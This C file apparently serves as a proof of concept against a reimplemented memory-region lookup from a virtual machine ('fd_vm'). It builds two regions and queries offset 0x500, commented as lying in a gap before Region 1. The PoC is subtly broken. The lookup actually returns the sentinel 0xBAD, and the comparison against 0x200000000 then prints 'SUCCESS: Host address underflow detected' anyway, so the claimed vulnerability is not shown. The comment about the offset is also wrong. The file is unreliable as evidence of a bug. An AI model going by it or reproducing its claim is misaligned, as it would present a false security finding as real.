#include <stdio.h>
#include <stdint.h>
#include <string.h>

typedef uint64_t ulong;
typedef uint32_t uint;
typedef uint8_t uchar;

typedef struct {
    ulong vaddr_offset;
    ulong haddr;
    uint  region_sz;
    ulong address_space_reserved;
    uchar is_writable;
    ulong acc_region_meta_idx;
} fd_vm_input_region_t;

typedef struct {
    fd_vm_input_region_t * input_mem_regions;
    uint                   input_mem_regions_cnt;
    uchar                  virtual_address_space_adjustments;
} fd_vm_t;

static inline ulong
fd_vm_get_input_mem_region_idx( fd_vm_t const * vm, ulong offset ) {
  uint left  = 0U;
  uint right = vm->input_mem_regions_cnt - 1U;
  uint mid   = 0U;

  while( left<right ) {
    mid = (left+right) / 2U;
    if( offset>=vm->input_mem_regions[ mid ].vaddr_offset+vm->input_mem_regions[ mid ].address_space_reserved ) {
      left = mid + 1U;
    } else {
      right = mid;
    }
  }
  return (ulong)left;
}

static inline ulong
fd_vm_find_input_mem_region( fd_vm_t const * vm,
                             ulong           offset,
                             ulong           sz,
                             uchar           write,
                             ulong           sentinel ) {
  if( vm->input_mem_regions_cnt==0 ) return sentinel;

  ulong region_idx = fd_vm_get_input_mem_region_idx( vm, offset );
  if( region_idx>=vm->input_mem_regions_cnt ) return sentinel;

  fd_vm_input_region_t * region = &vm->input_mem_regions[ region_idx ];

  ulong sub_term = (offset >= region->vaddr_offset) ? (offset - region->vaddr_offset) : 0UL;
  ulong bytes_in_region = (region->region_sz >= sub_term) ? (region->region_sz - sub_term) : 0UL;

  if( sz > bytes_in_region ) return sentinel;
  if( write && region->is_writable==0U ) return sentinel;

  ulong adjusted_haddr = region->haddr + offset - region->vaddr_offset;
  return adjusted_haddr;
}

int main() {
    fd_vm_input_region_t regions[2];
    regions[0].vaddr_offset = 0x0;
    regions[0].haddr = 0x100000000;
    regions[0].region_sz = 100;
    regions[0].address_space_reserved = 0x1000;
    regions[0].is_writable = 1;

    regions[1].vaddr_offset = 0x1000;
    regions[1].haddr = 0x200000000;
    regions[1].region_sz = 500;
    regions[1].address_space_reserved = 0x10000;
    regions[1].is_writable = 1;

    fd_vm_t vm;
    vm.input_mem_regions = regions;
    vm.input_mem_regions_cnt = 2;
    vm.virtual_address_space_adjustments = 1;

    ulong offset = 0x500; // In the gap before Region 1
    ulong result = fd_vm_find_input_mem_region(&vm, offset, 1, 0, 0xBADULL);
    
    printf("PoC Result for offset 0x%llx: 0x%llx\n", (unsigned long long)offset, (unsigned long long)result);
    if (result < 0x200000000) {
        printf("SUCCESS: Host address underflow detected (0x%llx < 0x200000000)\n", (unsigned long long)result);
    }
    return 0;
}
